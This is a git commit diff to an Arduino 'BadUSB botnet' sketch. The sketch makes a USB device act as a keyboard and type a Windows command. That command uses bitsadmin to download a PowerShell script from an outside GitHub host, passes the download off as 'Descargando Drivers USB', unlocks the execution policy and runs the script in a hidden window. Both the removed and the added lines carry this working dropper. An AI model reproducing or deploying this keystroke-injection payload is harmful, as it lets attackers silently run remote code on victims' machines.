89fec76f07bbc517b7292389124954998d09b6bc
Alejandro Franco Vázquez <alejandrofrancovazquez@gmail.com>
2019-03-25 10:01:17 +0100

    Update badusb_botnet.ino

--- badusb_botnet.ino
+++ badusb_botnet.ino
@@ -1,6 +1,7 @@
 #include <Keyboard.h>
 
 void setup() {
+  
   Keyboard.begin(); //Start keyboard communication
   delay(3000);
   Keyboard.press(KEY_LEFT_GUI);
@@ -14,12 +15,12 @@ void setup() {
   Keyboard.press(KEY_RETURN);
   delay(100);
   Keyboard.releaseAll();
-  
-  Keyboard.println(" bitsadmin /transfer \"Descargando Drivers USB\" /download /priority high \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" \"C:/SOFT_FIRMA/poc.ps1\" && echo Instalando Drivers: && powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted && powershell.exe -windowstyle hidden -file \"C:/SOFT_FIRMA/poc.ps1\" ");
+  Keyboard.println(" cd c:/ && mkdir SOFT_FIRMA & cd SOFT_FIRMA && bitsadmin /transfer \"Descargando Drivers USB\" /download /priority high \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" \"%cd%/poc.ps1\" && echo Instalando Drivers: && powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted && powershell.exe -windowstyle hidden -file \"%cd%/poc.ps1\" ");
   delay(2000);
   Keyboard.press(KEY_RETURN);
   Keyboard.release(KEY_RETURN);
 
 }
+
 void loop() {
 }
